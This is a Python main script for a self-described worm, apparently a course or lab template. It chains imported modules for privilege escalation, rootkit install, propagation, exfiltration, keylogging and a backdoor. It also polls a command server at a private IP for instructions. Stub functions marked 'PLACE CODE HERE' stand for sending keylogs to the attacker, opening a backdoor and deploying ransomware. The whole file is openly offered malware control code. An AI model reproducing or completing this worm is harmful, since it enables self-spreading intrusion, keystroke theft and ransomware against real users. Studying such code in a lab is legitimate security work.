###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import requests
from time import sleep

from modules import privesc
from modules import rootkit
from modules import propagation
from modules import exfiltration
from modules import keylogger
from modules import backdoor
from modules import instructions

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

KEYLOG_TXT_FILE = './media/keylog.txt'
INSTRUCTIONS_SERVER_IP = 'http://10.0.2.15:8000/reset'

# Resets the current instruction so the program waits for the new one
def reset_instruction():
    try:
        response = requests.get(INSTRUCTIONS_SERVER_IP)
        # Raises an HTTPError for bad responses (4xx or 5xx)
        response.raise_for_status()
        # print('\tInstruction successfully reseted!')
    except requests.exceptions.RequestException as e:
        # print(f"Error resetting the instruction: {e}")
        pass

# Erases all the content of the keylog.txt file
def reset_keylog_file():
    with open(KEYLOG_TXT_FILE, 'w'): pass

# Sends keylog.txt to the attacker machine and resets it
def send_keylog_to_attacker():

    # PLACE CODE HERE...

    reset_keylog_file()

# Opens a backdoor with the attacker's machine
def start_backdoor():

    # PLACE CODE HERE...

    return

# Closes the backdoor with the attacker's machine
def stop_backdoor():

    # PLACE CODE HERE...

    return

# Deploys the ransomware
def deploy_ransomware():

    # PLACE CODE HERE...

    return

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def main():
    print("Worm just landed!")

    # map modules to function
    modules = {
        "privesc": privesc.run,
        "rootkit": rootkit.run,
        "propagation": propagation.run,
        "exfiltration": exfiltration.run,
        "keylogger": keylogger.run,
        "backdoor": backdoor.run,
        "instructions": instructions.run,
    }

    # first step
    next_step = "privesc"
    result = None

    while next_step != "clean":
        # execute module and get result and next step
        result, next_step = modules[next_step]()
        if result:
            if result.startswith('keylogger'):
                if result.endswith('send_log'): send_keylog_to_attacker()
                elif result.endswith('reset_log'): reset_keylog_file()
            
            elif result.startswith('backdoor'):
                if result.endswith('start'): start_backdoor()
                elif result.endswith('stop'): stop_backdoor()

            elif result.startswith('ransomware') and result.endswith('deploy'):
                deploy_ransomware()

            reset_instruction()

            if next_step == 'instructions': sleep(10)
        else:
            print(f"[-] Module {next_step} failed!")
            break


if __name__ == "__main__":
    main()